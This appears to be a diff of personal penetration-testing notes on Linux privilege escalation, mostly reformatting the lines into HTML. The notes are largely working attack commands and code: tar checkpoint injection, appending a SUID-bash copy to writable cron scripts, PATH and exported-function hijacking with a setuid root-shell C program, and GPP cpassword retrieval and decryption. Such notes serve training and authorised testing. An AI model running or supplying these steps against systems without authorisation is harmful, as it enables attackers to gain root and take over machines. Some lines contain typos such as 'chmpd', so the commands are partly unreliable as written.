@@ -175,53 +175,50 @@ touch  /directory/of/script--checkpoint=1<br>
 touch  /directory/of/script--checkpoint-action=exec=sh\ output.sh<br>
 /tmp/bash -p (have to wait for script to be run on timer)<br>
 <br>
-Cron Jobs with overwrite
-Check file perms of any cron jobs u find (ls -la filename.sh)
-If write permissions can overwrite file
-echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh
-
-Path
-find / -perm -u=s -exec ls -l {} \; 2>/dev/null
-Look for non linux binaries
-
+<h2>Cron Jobs with overwrite</h2><br>
+Check file perms of any cron jobs u find (ls -la filename.sh)<br>
+If write permissions can overwrite file<br>
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh<br>
+<br>
+<h2>Path</h2><br>
+find / -perm -u=s -exec ls -l {} \; 2>/dev/null<br>
+Look for non linux binaries<br>
+<br>
 Or - find / -type f -perm -04000 -ls 2>/dev/null and look at binaries, run strings on the path -- strings /location/path and see if anything's interesting are there any system commands being called without a path defined? If so see if you can write a new PATH -export PATH=/tmp(change to the directory exploit is located):$PATH
-To see current path type - echo "$PATH"
-
-1. In command prompt type:
-echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c (making new c file malicious service and writing it to the tmp folder)
-2. In command prompt type: gcc /tmp/service.c -o /tmp/service   (outputting the file from C)
-3. In command prompt type: export PATH=/tmp:$PATH  (creating new path variable)
-4. In command prompt type: /usr/local/bin/suid-env   (this changes to whatever binary you identified)
-5. In command prompt type: id
-
-Another way
-Repeat the find step ( - find / -type f -perm -04000 -ls 2>/dev/nul) and look at binary strings, if there is a system command being called with a direct service you could try create a new function as that service
-
-E.g. If a binary has /usr/sbin/service apache 2 this shows it is reaching out to /usr/sbin to call the system command service. 
-	1. Create a mew function with the path -- function /usr/sbin/service() {cp /bin/bash /tmp && chmpd +s /tmp/bash && /tmp/bash -p; }
-	2. Export - ---- export -f /usr/sbin/service (ovbs change to the system command u find)
-	3. Re -run the binary 
-
-
-GPP Attacks
-Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.
-Download if accessible via SMB by authing to smb - using mget command - mget * to download all files
-To decrypt cpassword - use tool call gpp-decrypt
-
-
-
-C code for priv esc
-int main() {
-        setuid(0);
-        system("/bin/bash -p");
-}
-
-Save as like service.c
-
-Then to compile run -- gcc -o service /path/of/file/service.c
-
-![image](https://user-images.githubusercontent.com/35967437/202722690-d92d3b63-6bab-411a-bb3c-977f16f9561b.png)
-
+To see current path type - echo "$PATH"<br>
+<br>
+1. In command prompt type:<br>
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c (making new c file malicious service and writing it to the tmp folder)<br>
+2. In command prompt type: gcc /tmp/service.c -o /tmp/service   (outputting the file from C)<br>
+3. In command prompt type: export PATH=/tmp:$PATH  (creating new path variable)<br>
+4. In command prompt type: /usr/local/bin/suid-env   (this changes to whatever binary you identified)<br>
+5. In command prompt type: id<br>
+<br>
+Another way<br>
+Repeat the find step ( - find / -type f -perm -04000 -ls 2>/dev/nul) and look at binary strings, if there is a system command being called with a direct service you could try create a new function as that service<br>
+<br>
+E.g. If a binary has /usr/sbin/service apache 2 this shows it is reaching out to /usr/sbin to call the system command service. <br>
+	1. Create a mew function with the path -- function /usr/sbin/service() {cp /bin/bash /tmp && chmpd +s /tmp/bash && /tmp/bash -p; }<br>
+	2. Export - ---- export -f /usr/sbin/service (ovbs change to the system command u find)<br>
+	3. Re -run the binary <br>
+<br>
+<br>
+<h2>GPP Attacks</h2><br>
+Sometimes stored in sysvol, cpassword is encrypted, can be de-crypted. Check with Metasploit - smb_enum_gpp.<br>
+Download if accessible via SMB by authing to smb - using mget command - mget * to download all files<br>
+To decrypt cpassword - use tool call gpp-decrypt<br>
+<br>
+<br>
+C code for priv esc<br>
+int main() {<br>
+        setuid(0);<br>
+        system("/bin/bash -p");<br>
+}<br>
+<br>
+Save as like service.c<br>
+<br>
+Then to compile run -- gcc -o service /path/of/file/service.c<br>
+<br>
 
 <h1>kernel exploits</h1>
 if established session with MSFCONSOLE while sessions is established type run post/multi/recon/local_exploit_suggester identify vulnerability and type use exploitname set SESSION [meterpreter SESSION number] set LPORT run <br>
